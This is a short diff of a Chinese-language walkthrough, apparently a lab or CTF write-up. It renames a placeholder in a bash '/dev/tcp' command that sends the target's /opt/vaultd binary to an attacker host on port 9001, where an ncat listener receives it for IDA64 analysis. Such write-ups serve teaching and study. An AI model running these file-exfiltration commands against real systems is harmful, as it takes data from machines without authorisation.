@@ -575,7 +575,7 @@ cmd /c "ncat.exe -lvnp 9001 > vaultd.elf"
 目标机没有 `nc` 的话，可以用 bash 的 `/dev/tcp` 发送：
 
 ```bash
-bash -c 'cat /opt/vaultd > /dev/tcp/<Windows_IP>/9001'
+bash -c 'cat /opt/vaultd > /dev/tcp/<攻击机IP>/9001'
 ```
 
 IDA64 正常识别后，左侧 Functions 窗口能直接看到这些函数名：
